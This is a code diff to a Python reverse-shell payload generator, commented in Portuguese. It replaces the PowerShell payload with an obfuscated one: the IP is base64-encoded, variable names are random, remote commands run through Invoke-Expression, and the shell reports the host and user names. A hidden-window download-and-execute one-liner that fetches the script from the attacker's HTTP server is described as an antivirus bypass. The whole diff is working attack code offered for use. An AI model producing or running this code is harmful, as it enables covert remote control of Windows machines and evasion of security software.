@@ -51,56 +51,75 @@ class PayloadGenerator:
             raise ValueError(f"Método '{method}' não implementado")
     
     def _generate_powershell_payload(self, ip_shell: str, port: int) -> Dict[str, str]:
-        """Gera payload PowerShell com download via HTTP"""
+        """Gera payload PowerShell ofuscado com download alternativo"""
+        import base64
+        
+        # Codifica o IP em base64 para ofuscação
+        ip_bytes = ip_shell.encode('utf-8')
+        ip_base64 = base64.b64encode(ip_bytes).decode('utf-8')
+        
         # Gera nome único para o arquivo
         filename = f"ps1_{uuid.uuid4().hex[:8]}.ps1"
         filepath = self.payloads_dir / filename
         
-        # Payload PowerShell para reverse shell (versão melhorada com reconexão)
+        # Payload PowerShell ofuscado que será baixado
         ps_payload = f"""
-do {{
-    Start-Sleep -Seconds 1
-    try {{
-        $ClienteTCP = New-Object Net.Sockets.TCPClient("{ip_shell}", {port})
-    }} catch {{}}
-}} until ($ClienteTCP.Connected)
-
-$FluxoDeRede = $ClienteTCP.GetStream()
-$EscritorDeFluxo = New-Object IO.StreamWriter($FluxoDeRede)
-
-function EscreverNoFluxo ($Texto) {{
-    [byte[]]$script:BufferDeRecepcao = 0..$ClienteTCP.ReceiveBufferSize | % {{0}}
-    $EscritorDeFluxo.Write($Texto + 'SHELL> ')
-    $EscritorDeFluxo.Flush()
+try {{
+$CQFMsfKxtrsgNcx = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("{ip_base64}"))
+$rsovi_ybpst_hxo = {port}
+$CcDDVMiOPwURX = New-Object System.Net.Sockets.TCPClient($CQFMsfKxtrsgNcx, $rsovi_ybpst_hxo)
+$qwyemjh = $CcDDVMiOPwURX.GetStream()
+$nbr_dcckk = New-Object System.IO.StreamWriter($qwyemjh)
+$tGoWPjSDY = New-Object System.IO.StreamReader($qwyemjh)
+$csbnsi = "Conexão estabelecida de $env:COMPUTERNAME ($env:USERNAME)"
+$nbr_dcckk.WriteLine($csbnsi)
+$nbr_dcckk.Flush()
+while ($CcDDVMiOPwURX.Connected) {{
+$nbr_dcckk.Write("SHELL> ")
+$nbr_dcckk.Flush()
+$ezswz_uckssq_lsxede = ""
+while ($qwyemjh.DataAvailable -or $ezswz_uckssq_lsxede -eq "") {{
+if (-not $qwyemjh.DataAvailable) {{
+Start-Sleep -Milliseconds 100
+continue
 }}
-
-EscreverNoFluxo ''
-
-while(($BytesLidos = $FluxoDeRede.Read($BufferDeRecepcao, 0, $BufferDeRecepcao.Length)) -gt 0) {{
-    $ComandoRecebido = ([text.encoding]::UTF8).GetString($BufferDeRecepcao, 0, $BytesLidos - 1)
-    $SaidaDeComando = try {{
-        Invoke-Expression $ComandoRecebido 2>&1 | Out-String
-    }} catch {{
-        $_ | Out-String
-    }}
-    EscreverNoFluxo ($SaidaDeComando)
+$ezswz_uckssq_lsxede = $tGoWPjSDY.ReadLine()
+if ($ezswz_uckssq_lsxede -eq "exit") {{
+$CcDDVMiOPwURX.Close()
+return
 }}
-
-$EscritorDeFluxo.Close()
+$MhwOtwaGGgQxnq = ""
+try {{
+$MhwOtwaGGgQxnq = Invoke-Expression $ezswz_uckssq_lsxede 2>&1 | Out-String
+}} catch {{
+$MhwOtwaGGgQxnq = "[ERRO] " + $_.Exception.Message
+}}
+$nbr_dcckk.WriteLine($MhwOtwaGGgQxnq)
+$nbr_dcckk.Flush()
+}}
+}}
+}} catch {{
+}} finally {{
+if ($nbr_dcckk) {{ $nbr_dcckk.Close() }}
+if ($tGoWPjSDY) {{ $tGoWPjSDY.Close() }}
+if ($qwyemjh) {{ $qwyemjh.Close() }}
+if ($CcDDVMiOPwURX) {{ $CcDDVMiOPwURX.Close() }}
+}}
 """
         
         # Salva arquivo PowerShell
         with open(filepath, 'w', encoding='utf-8') as f:
             f.write(ps_payload.strip())
         
-        # Comando para download e execução
-        download_command = f"powershell -ExecutionPolicy Bypass -Command \"IEX(New-Object Net.WebClient).downloadString('http://{ip_shell}:8000/{filename}')\""
+        # Método alternativo de download para bypass de antivírus
+        # Usando System.Net.WebRequest ao invés de WebClient
+        download_command = f"powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"$w=[System.Net.WebRequest]::Create('http://{ip_shell}:8000/{filename}');$r=$w.GetResponse();$s=$r.GetResponseStream();$sr=New-Object System.IO.StreamReader($s);$c=$sr.ReadToEnd();$sr.Close();$s.Close();$r.Close();IEX($c)\""
         
         return {
             'command': download_command,
             'method': 'powershell',
             'os_type': 'windows',
-            'description': 'Windows PowerShell avançado via HTTP (reconexão automática)',
+            'description': 'Windows PowerShell ofuscado via HTTP (bypass antivírus)',
             'payload_file': str(filepath),
             'http_url': f"http://{ip_shell}:8000/{filename}"
         }
@@ -123,7 +142,7 @@ $EscritorDeFluxo.Close()
                 'python': 'Socket Python (requer Python instalado)'
             },
             'windows': {
-                'powershell': 'PowerShell avançado via HTTP (reconexão automática)'
+                'powershell': 'PowerShell ofuscado via HTTP (bypass antivírus + variáveis aleatórias)'
             }
         }
         
